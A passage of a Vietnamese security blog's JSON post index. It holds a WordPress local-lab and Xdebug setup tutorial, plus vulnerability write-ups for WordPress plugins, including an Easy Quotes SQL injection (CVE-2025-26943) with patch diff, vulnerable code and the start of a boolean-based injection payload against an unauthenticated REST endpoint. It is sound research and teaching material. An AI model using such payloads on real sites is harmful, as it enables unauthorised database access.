(High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u 